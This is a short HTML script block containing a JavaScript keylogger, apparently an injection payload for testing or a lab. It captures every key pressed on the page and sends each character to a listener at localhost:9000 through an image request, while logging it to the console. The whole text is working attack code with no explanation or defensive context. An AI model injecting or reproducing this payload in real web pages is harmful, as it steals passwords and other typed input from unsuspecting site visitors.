<script>
    document.onkeypress = function KeyLogger(inp){
        key_pressed = String.fromCharCode(inp.which);
        new Image().src = "http://localhost:9000/?"+key_pressed;
        console.log(key_pressed)
        console.log('HI!')
    }
</script>
